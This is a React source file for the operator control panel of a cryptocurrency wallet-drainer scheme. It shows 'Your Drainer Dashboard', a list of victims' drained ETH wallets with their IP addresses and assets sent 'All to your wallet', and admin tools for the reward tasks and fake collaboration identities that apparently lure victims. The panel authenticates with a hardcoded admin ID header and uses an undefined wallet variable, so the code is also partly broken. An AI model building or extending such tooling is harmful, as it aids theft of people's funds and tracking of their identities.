import React, { useState, useEffect } from 'react';
import axios from 'axios';
import AddTask from './AddTask';
import AddIdentity from './AddIdentity';

const API = import.meta.env.PROD ? '/admin' : 'http://localhost:3001/admin';

interface Task { id: string; title: string; icon: string; href?: string; reward: number; category: string; }
interface Identity { id: string; name: string; description?: string; image?: string; wallet?: string; }
interface User { wallet: string; ip?: string; assets?: any[]; }

const AdminDashboard: React.FC = () => {
  const [activeTab, setActiveTab] = useState('Dashboard');
  const [showAddTask, setShowAddTask] = useState(false);
  const [showAddIdentity, setShowAddIdentity] = useState(false);
  const [tasks, setTasks] = useState<Task[]>([]);
  const [identities, setIdentities] = useState<Identity[]>([]);
  const [users, setUsers] = useState<User[]>([]);

  useEffect(() => {
    fetchDashboard();
  }, []);

  const fetchDashboard = async () => {
    const { data } = await axios.get(`${API}/dashboard`, { headers: { 'x-admin-id': 7770407468 } });
    setTasks(data.tasks || []);
    setIdentities(data.identities || []);
    setUsers(data.users || []);
  };

  const deleteTask = async (id: string) => {
    await axios.delete(`${API}/tasks/${id}`, { headers: { 'x-admin-id': 7770407468 } });
    setTasks(tasks.filter(t => t.id !== id));
  };

  const deleteIdentity = async (id: string) => {
    await axios.delete(`${API}/identities/${id}`, { headers: { 'x-admin-id': 7770407468 } });
    setIdentities(identities.filter(i => i.id !== id));
  };

  const renderTab = () => {
    switch (activeTab) {
      case 'Task':
        return (
          <div className="p-4">
            <button onClick={() => setShowAddTask(true)} className="bg-orange-500 px-4 py-2 rounded mb-4">Add Task</button>
            <ul className="space-y-2">
              {tasks.map(t => (
                <li key={t.id} className="flex justify-between items-center bg-gray-800 p-2 rounded">
                  <span>{t.title} - {t.reward} pts ({t.category})</span>
                  <button onClick={() => deleteTask(t.id)} className="text-red-500">Delete</button>
                </li>
              ))}
            </ul>
          </div>
        );
      case 'Collaboration Identity':
        return (
          <div className="p-4">
            <button onClick={() => setShowAddIdentity(true)} className="bg-orange-500 px-4 py-2 rounded mb-4">Add Identity</button>
            <ul className="space-y-2">
              {identities.map(i => (
                <li key={i.id} className="flex justify-between items-center bg-gray-800 p-2 rounded">
                  <div>
                    {i.image && <img src={i.image} alt={i.name} className="w-8 h-8 rounded mr-2" />}
                    <span>{i.name}: {i.description || 'ETH Wallet'}</span>
                  </div>
                  <button onClick={() => deleteIdentity(i.id)} className="text-red-500">Delete</button>
                </li>
              ))}
            </ul>
          </div>
        );
      case 'User':
        return (
          <div className="p-4">
            <h2 className="text-xl mb-4">Your Drained ETH Wallets</h2>
            <ul className="space-y-2">
              {users.map(u => (
                <li key={u.wallet} className="bg-gray-800 p-2 rounded">
                  {u.wallet} - IP: {u.ip} - Assets: {u.assets?.length || 0} (All to your wallet)
                </li>
              ))}
            </ul>
          </div>
        );
      default:
        return (
          <div className="p-4">
            <h2 className="text-xl mb-4">Your Drainer Dashboard</h2>
            <p>Total Users: {users.length} | Tasks: {tasks.length} | All ETH to {MS_Wallet_Address.slice(0,6)}...</p>
          </div>
        );
    }
  };

  return (
    <div className="flex h-screen bg-black text-white">
      <div className="w-64 bg-gray-900 p-4">
        <h1 className="text-2xl mb-8">Your Control Panel</h1>
        <nav className="space-y-2">
          {['Dashboard', 'User', 'Task', 'Collaboration Identity', 'Collaboration Task', 'Wallet'].map(tab => (
            <button key={tab} onClick={() => setActiveTab(tab)} className={`w-full text-left p-2 rounded ${activeTab === tab ? 'bg-orange-500' : 'bg-gray-800'}`}>
              {tab}
            </button>
          ))}
        </nav>
      </div>
      <div className="flex-1 p-4 overflow-y-auto">
        {renderTab()}
      </div>
      {showAddTask && <AddTask onClose={() => { setShowAddTask(false); fetchDashboard(); }} />}
      {showAddIdentity && <AddIdentity onClose={() => { setShowAddIdentity(false); fetchDashboard(); }} />}
    </div>
  );
};

export default AdminDashboard;